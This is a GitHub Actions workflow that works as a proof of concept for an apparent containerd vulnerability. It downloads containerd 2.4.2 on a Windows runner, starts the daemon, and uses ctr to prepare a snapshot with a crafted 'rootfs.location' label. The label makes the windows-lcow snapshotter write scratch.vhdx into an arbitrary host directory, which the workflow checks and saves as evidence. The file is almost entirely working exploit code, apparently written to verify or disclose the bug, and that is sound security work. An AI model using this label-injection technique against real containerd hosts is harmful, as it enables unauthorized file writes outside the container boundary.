name: D17 LCOW host-file write PoC
on:
  workflow_dispatch:
  push:
    branches: [cmd-bot]

jobs:
  poc:
    runs-on: windows-latest
    timeout-minutes: 20
    steps:
      - name: Download containerd 2.4.2 and prep dirs
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $base = 'C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin", "$base\root", "$base\state", "$base\canary" | Out-Null
          Write-Output "CANARY_BEFORE:"
          Get-ChildItem "$base\canary" -Force | Select-Object Name,Length | Format-Table
          Write-Output "PREREQ scratch present? $(Test-Path "$base\canary\scratch.vhdx")"
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          Get-ChildItem "$base\bin\bin" | Select-Object Name,Length | Format-Table

      - name: Write containerd config
        shell: pwsh
        run: |
          $base = 'C:\ctdpoc'
          $lines = @(
            'version = 2',
            'root = "C:/ctdpoc/root"',
            'state = "C:/ctdpoc/state"',
            '[grpc]',
            "  address = '127.0.0.1:22333'",
            '  uid = 0',
            '  gid = 0',
            '[debug]',
            "  level = 'debug'"
          )
          $lines | Set-Content -Path "$base\config.toml" -Encoding ascii
          Write-Output '=== config.toml ==='
          Get-Content "$base\config.toml"

      - name: Start containerd and list snapshotter plugins
        shell: pwsh
        run: |
          $base = 'C:\ctdpoc'
          $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
          Write-Output "CONTAINERD_PID=$($p.Id)"
          Start-Sleep -Seconds 8
          Write-Output '--- alive? ---'
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          Write-Output '--- plugins (snapshotter) ---'
          & "$base\bin\bin\ctr.exe" --address 127.0.0.1:22333 plugins ls 2>&1 | Select-String 'snapshotter'
          Write-Output '--- stderr tail ---'
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 40 }

      - name: Trigger malicious snapshot Prepare via ctr
        shell: pwsh
        run: |
          $base = 'C:\ctdpoc'
          $ctr = "$base\bin\bin\ctr.exe"
          $addr = '127.0.0.1:22333'
          $loc = 'C:\ctdpoc\canary'
          $label = "containerd.io/snapshot/io.microsoft.container.storage.rootfs.location=$loc"
          Write-Output "=== malicious label: $label ==="
          & $ctr --address $addr -n d17poc snapshot prepare --label $label --snapshotter 'windows-lcow' victim-sandbox '' 2>&1 | Tee-Object -FilePath "$base\prepare.out"
          Write-Output "CTR_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 3
          Write-Output '=== CANARY AFTER ==='
          Get-ChildItem $loc -Force | Select-Object Name,Length,LastWriteTime | Format-Table
          $probe = Join-Path $loc 'scratch.vhdx'
          Write-Output "HOST_FILE_WRITTEN=$(Test-Path $probe)"
          if (Test-Path $probe) { Get-Item $probe | Select-Object FullName,Length,LastWriteTime | Format-List; Get-FileHash $probe -Algorithm SHA256 | Format-List }
          Write-Output '=== daemon stderr tail ==='
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 60 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-poc-evidence
          path: |
            C:\ctdpoc\prepare.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
            C:\ctdpoc\config.toml
          if-no-files-found: warn
